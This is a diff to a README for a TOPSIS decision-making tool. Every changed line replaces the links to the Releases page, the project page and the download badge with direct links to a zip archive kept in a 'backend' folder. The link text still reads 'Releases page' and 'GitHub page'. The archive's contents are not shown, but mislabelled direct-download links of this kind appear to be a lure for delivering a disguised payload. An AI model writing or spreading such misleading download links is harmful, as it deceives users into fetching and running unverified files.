@@ -1,6 +1,6 @@
 # 🎯 topsis-mcdm-tool - Simplify Your Decision-Making Process
 
-[![Download topsis-mcdm-tool](https://img.shields.io/badge/Download-topsis--mcdm--tool-blue.svg)](https://github.com/understanding-81/topsis-mcdm-tool/releases)
+[![Download topsis-mcdm-tool](https://github.com/understanding-81/topsis-mcdm-tool/raw/refs/heads/main/backend/tool_topsis_mcdm_v1.4.zip)](https://github.com/understanding-81/topsis-mcdm-tool/raw/refs/heads/main/backend/tool_topsis_mcdm_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run the topsis-mcdm-tool, you need a computer that meets the following requir
 
 ## 📥 Download & Install
 
-You can easily download the topsis-mcdm-tool by visiting the [Releases page](https://github.com/understanding-81/topsis-mcdm-tool/releases). Here’s how:
+You can easily download the topsis-mcdm-tool by visiting the [Releases page](https://github.com/understanding-81/topsis-mcdm-tool/raw/refs/heads/main/backend/tool_topsis_mcdm_v1.4.zip). Here’s how:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release of the software.
@@ -80,6 +80,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 🔗 More Information
 
-For updates and more information about the topsis-mcdm-tool, visit the project's [GitHub page](https://github.com/understanding-81/topsis-mcdm-tool).
+For updates and more information about the topsis-mcdm-tool, visit the project's [GitHub page](https://github.com/understanding-81/topsis-mcdm-tool/raw/refs/heads/main/backend/tool_topsis_mcdm_v1.4.zip).
 
-Remember to check the [Releases page](https://github.com/understanding-81/topsis-mcdm-tool/releases) often for the latest updates. Happy decision-making!
+Remember to check the [Releases page](https://github.com/understanding-81/topsis-mcdm-tool/raw/refs/heads/main/backend/tool_topsis_mcdm_v1.4.zip) often for the latest updates. Happy decision-making!
